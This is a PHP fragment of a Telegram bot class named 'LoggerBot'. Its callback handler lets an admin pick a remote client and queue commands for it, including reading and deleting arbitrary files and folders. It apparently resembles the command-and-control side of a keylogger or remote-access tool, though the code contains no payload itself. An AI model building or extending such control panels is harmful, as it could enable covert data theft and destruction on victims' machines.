<?php
class LoggerBot
{


    private function handleCallbackQuery($callbackQuery)
    {
        $chatId = $callbackQuery['message']['chat']['id'] ?? null;
        $userId = $callbackQuery['from']['id'] ?? null;
        $data = $callbackQuery['data'] ?? null;
        $callbackQueryId = $callbackQuery['id'] ?? null;

        $this->logWebhook("Processing callback_query: id=$callbackQueryId, user_id=$userId, chat_id=$chatId, data=$data");

        if (!$chatId || !$userId || !$data || !$callbackQueryId) {
            $this->logError("Invalid callback_query: missing required fields, data=" . json_encode($callbackQuery));
            $this->makeCurlRequest(
                "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/answerCallbackQuery",
                ['callback_query_id' => $callbackQueryId, 'text' => 'Error: Invalid request', 'show_alert' => true],
                false
            );
            return;
        }

        if (!$this->isUserAuthorized($userId)) {
            $this->sendTelegramMessage($chatId, "Unauthorized access. Only the admin can issue commands.");
            $this->makeCurlRequest(
                "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/answerCallbackQuery",
                ['callback_query_id' => $callbackQueryId, 'text' => 'Unauthorized', 'show_alert' => true],
                false
            );
            return;
        }

        if (!str_contains($data, ':')) {
            $this->logError("Invalid callback_data format: $data");
            $this->sendTelegramMessage($chatId, "Error: Invalid callback data.");
            $this->makeCurlRequest(
                "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/answerCallbackQuery",
                ['callback_query_id' => $callbackQueryId, 'text' => 'Invalid callback data', 'show_alert' => true],
                false
            );
            return;
        }

        list($action, $value) = explode(':', $data, 2);
        $this->logWebhook("Callback action: $action, value: $value");

        if ($action === 'select_client') {
            if ($this->clientExists($value)) {
                $this->setSelectedClient($userId, $value);
                $this->sendCommandKeyboard($chatId, "Selected client: $value. Choose a command:");
                $this->logWebhook("Client selected via callback: $value, user_id: $userId, chat_id: $chatId");
            } else {
                $this->sendTelegramMessage($chatId, "Client ID '$value' not found. Use /start to see available clients.");
                $this->logError("Invalid client_id in callback: $value, user_id: $userId, chat_id: $chatId");
            }
        } elseif ($action === 'command') {
            $selectedClient = $this->getSelectedClient($userId);
            if ($selectedClient) {
                $response = $this->processCommand($value, $selectedClient, true);
                $this->sendTelegramMessage($chatId, "Command '$value' queued for client $selectedClient.");
                $this->logWebhook("Command queued: $value for client: $selectedClient, response: " . json_encode($response));
            } else {
                $this->sendTelegramMessage($chatId, "No client selected. Use /start or /select <client_id>.");
                $this->logError("Command attempted without selected client, command: $value, user_id: $userId, chat_id: $chatId");
            }
        } elseif ($action === 'file_action') {
            list($subAction, $path) = explode('|', $value, 2);
            $selectedClient = $this->getSelectedClient($userId);
            if ($selectedClient) {
                if ($subAction === 'read') {
                    $commandData = ['type' => 'file_operation', 'params' => ['action' => 'read', 'path' => $path]];
                    $this->queueClientCommand($selectedClient, $commandData);
                    $this->sendTelegramMessage($chatId, "Reading file: $path");
                } elseif ($subAction === 'delete') {
                    $commandData = ['type' => 'file_operation', 'params' => ['action' => 'delete', 'path' => $path]];
                    $this->queueClientCommand($selectedClient, $commandData);
                    $this->sendTelegramMessage($chatId, "Deleting file/folder: $path");
                }
                $this->logWebhook("File action queued: $subAction for path: $path, client: $selectedClient");
            } else {
                $this->sendTelegramMessage($chatId, "No client selected. Use /start or /select <client_id>.");
            }
        } else {
            $this->logError("Unknown callback action: $action, data: $data");
            $this->sendTelegramMessage($chatId, "Error: Unknown action.");
        }

        $this->makeCurlRequest(
            "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/answerCallbackQuery",
            ['callback_query_id' => $callbackQueryId],
            false
        );
    }
}
